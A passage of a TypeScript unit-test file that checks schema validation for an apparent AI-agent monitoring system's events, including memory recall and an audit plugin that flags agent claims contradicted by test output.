		});
		expect(validate(event).valid).toBe(true);
	});
});

describe("memory.recalled substrate event", () => {
	beforeEach(() => {
		_resetSequence();
	});

	it("validates a recalled feedback memory", () => {
		const event = createEvent({
			runtime: "claude-code",
			plugin: "ecosystem",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: MEMORY_RECALLED,
			payload: {
				project_key: "abc123def456",
				memory_file: "feedback_no_trailing_summaries.md",
				memory_type: "feedback",
				recall_position: 2,
			},
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates each memory_type enum value", () => {
		for (const memory_type of [
			"user",
			"feedback",
			"project",
			"reference",
		] as const) {
			const event = createEvent({
				runtime: "claude-code",
				plugin: "ecosystem",
				machine_id: MACHINE_ID,
				session_id: SESSION_ID,
				event_type: MEMORY_RECALLED,
				payload: {
					project_key: "abc123def456",
					memory_file: `${memory_type}_example.md`,
					memory_type,
				},
			});
			expect(validate(event).valid).toBe(true);
		}
	});
});

describe("assayer lifecycle events", () => {
	beforeEach(() => {
		_resetSequence();
	});

	const SID = "session-assayer-1";
	const AUDIT = "01J000000000000000000ASSAY";

	function assay<T extends EventType>(
		event_type: T,
		payload: Parameters<typeof createEvent<T>>[0]["payload"],
	) {
		return createEvent({
			runtime: "claude-code",
			plugin: "assayer",
			machine_id: MACHINE_ID,
			session_id: SID,
			event_type,
			payload,
		});
	}

	it("validates a full audit lifecycle end-to-end", () => {
		const events = [
			assay(ASSAYER_AUDIT_STARTED, {
				audit_id: AUDIT,
				claim_count: 3,
				trigger: "stop",
				command_count: 5,
			}),
			assay(ASSAYER_CLAIM_CONTRADICTED, {
				audit_id: AUDIT,
				claim: "I ran the tests and they all pass.",
				claim_type: "tests_pass",
				evidence_command: "npm test",
				result_excerpt: "Tests: 1 failed, 32 passed",
				exit_code: 1,
				confidence: 0.9,
			}),
			assay(ASSAYER_CLAIM_UNVERIFIED, {
				audit_id: AUDIT,
				claim: "The deploy is healthy.",
				claim_type: "generic",
				reason: "no_matching_command",
			}),
			assay(ASSAYER_AUDIT_COMPLETE, {
				audit_id: AUDIT,
				claim_count: 3,
				corroborated: 1,
				contradicted: 1,
				unverified: 1,
				verdict: "contradictions_found",
				duration_ms: 4200,
			}),
		];

		for (const event of events) {
			const result = validate(event);
			if (!result.valid) {
				throw new Error(
					`expected ${event.event_type} to validate, got: ${result.errors
						.map((e) => `${e.path}: ${e.message}`)
						.join("; ")}`,
				);
			}
		}
	});

	it("rejects assayer.claim.contradicted missing evidence_command", () => {
		const event = assay(ASSAYER_CLAIM_CONTRADICTED, {
			audit_id: AUDIT,
			claim: "Build is green.",
			claim_type: "build_succeeds",
			evidence_command: "npm run build",
		}) as unknown as Record<string, unknown>;
		delete (event.payload as Record<string, unknown>).evidence_command;
		expect(validate(event).valid).toBe(false);
	});

	it("validates a clean audit with no contradictions", () => {
		const event = assay(ASSAYER_AUDIT_COMPLETE, {
			audit_id: AUDIT,
			claim_count: 2,
			corroborated: 2,
			contradicted: 0,
			unverified: 0,
			verdict: "clean",
			duration_ms: 1500,
		});
		expect(validate(event).valid).toBe(true);
	});
});

describe("isEventOfType", () => {
	beforeEach(() => {
		_resetSequence();
	});

	it("narrows payload correctly for matching type", () => {
		const event: OnlookerEvent = createEvent({
			runtime: "claude-code",
			plugin: "tribunal",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: TRIBUNAL_VERDICT,
			payload: {
				task_id: "task-1",
				score: 0.5,
				passed: false,
				judge_type: "security",
			},
		});
		if (isEventOfType(event, TRIBUNAL_VERDICT)) {
			expect(event.payload.task_id).toBe("task-1");
			expect(event.payload.judge_type).toBe("security");
		} else {
			throw new Error("expected tribunal verdict");
		}
	});

	it("returns false for wrong type", () => {
		const event: OnlookerEvent = createEvent({
			runtime: "claude-code",
			plugin: "core",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SESSION_START,
			payload: { working_directory: "/tmp" },
		});
		expect(isEventOfType(event, TRIBUNAL_VERDICT)).toBe(false);
	});
});

describe("isEventType", () => {
	it("returns true for every value in ALL_EVENT_TYPES", () => {
		for (const t of ALL_EVENT_TYPES) {
			expect(isEventType(t)).toBe(true);
		}
	});

	it("returns false for unknown strings and partial matches", () => {
		expect(isEventType("nope")).toBe(false);
		expect(isEventType("")).toBe(false);
		expect(isEventType("session")).toBe(false);
		expect(isEventType("session.")).toBe(false);
		expect(isEventType("SESSION.START")).toBe(false);
		expect(isEventType("session.start ")).toBe(false);
		expect(isEventType("tribunal.")).toBe(false);
	});
});

describe("ALL_EVENT_TYPES", () => {
	it("has no duplicates", () => {
		const set = new Set<EventType>(ALL_EVENT_TYPES);
		expect(set.size).toBe(ALL_EVENT_TYPES.length);
	});

	it("has exactly 114 entries", () => {
		expect(ALL_EVENT_TYPES.length).toBe(114);
	});
});
